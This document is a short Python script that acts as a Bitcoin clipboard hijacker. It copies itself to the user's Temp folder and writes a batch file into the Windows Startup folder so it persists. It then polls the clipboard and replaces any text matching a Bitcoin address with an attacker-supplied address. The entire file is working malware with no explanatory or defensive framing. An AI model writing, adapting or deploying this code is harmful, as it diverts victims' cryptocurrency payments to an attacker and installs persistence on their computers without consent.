import getpass
import os
import sys
import clipboard
import re
from shutil import copy

address = sys.argv[1]

USER_NAME = getpass.getuser()

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))

    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    temp_path = r'C:\Users\%s\AppData\Local\Temp' % USER_NAME
    try:
        copy(__file__, temp_path)
    except:
        pass
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start python {}'.format(temp_path + '\\' + os.path.basename(__file__)) + address)

add_to_startup()

while True:
    x = clipboard.paste()
    while True:
        if x != clipboard.paste():
            if re.match('^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$', clipboard.paste()) is not None:
                clipboard.copy(address)
